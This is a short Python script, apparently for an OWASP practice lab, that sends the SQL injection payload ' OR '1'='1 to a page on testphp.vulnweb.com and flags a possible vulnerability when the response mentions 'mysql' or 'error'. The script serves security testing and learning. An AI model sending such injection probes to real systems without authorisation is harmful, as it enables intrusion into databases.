#!/usr/bin/env python3
import requests
TARGET = "http://testphp.vulnweb.com"
def check_sqli(url):
    payload = "' OR '1'='1"
    try:
        r = requests.get(f"{url}?id={payload}", timeout=5)
        if "mysql" in r.text.lower() or "error" in r.text.lower():
            print(f"[CRITICAL] Possible SQLi at {url}")
        else:
            print(f"[OK] No SQLi at {url}")
    except Exception as e:
        print(f"[ERR] {e}")

if __name__ == "__main__":
    print(f"OWASP Lab Automator — Testing {TARGET}")
    check_sqli(TARGET + "/artists.php")
